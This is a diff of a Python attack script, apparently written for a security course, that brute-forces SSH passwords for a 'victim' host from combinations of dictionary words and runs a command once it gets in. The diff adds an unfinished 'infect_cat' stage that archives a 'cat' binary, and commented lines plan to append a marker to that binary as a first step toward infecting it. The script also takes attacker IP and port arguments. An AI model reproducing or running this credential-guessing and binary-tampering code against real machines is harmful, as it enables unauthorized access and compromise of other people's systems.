@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
+import os
 import sys
 import paramiko
 import itertools
+import tarfile
 
 def connect_ssh(password):
     global victim_ip, victim_name
@@ -12,7 +14,7 @@ def connect_ssh(password):
         ssh_client.connect(hostname=victim_ip, username=victim_name, password=password)
         print("success")
         stdin, stdout, stderr = ssh_client.exec_command("touch /home/csc2023/Desktop/test.txt")
-        print(stdout.readlines())
+        # print(stdout.readlines())
         return True
     except:
         ssh_client.close()
@@ -29,12 +31,26 @@ def try_password():
                 for idx in comb: s += dictionary[idx]
                 print(s)
                 if connect_ssh(s): return
-                
+
+def infect_cat():
+    # path = "/home/csc2023/cat"
+    path = "/media/sf_codes/cat_test"
+    origin_size = os.stat(path).st_size
+    with tarfile.open('cat.tar', 'w') as tf:
+        tf.add(path)
+        tf.close()
+    # with open(path, 'a') as cat:
+
+        # add  0xdeadbeaf in the last 4 bytes of the file
+        # cat.seek(0, 2) # to the end of the file
+        # cat.write("deadbeaf")
+        # cat.close()
 
 # ./crack_attack <Victim IP> <Attacker IP> <Attacker port>
 victim_name = "csc2023"
 victim_ip = sys.argv[1]
 attacker_ip = sys.argv[2]
 attacker_port = (int)(sys.argv[3])
-try_password()
+# try_password()
 # connect_ssh("csc2023")
+infect_cat()
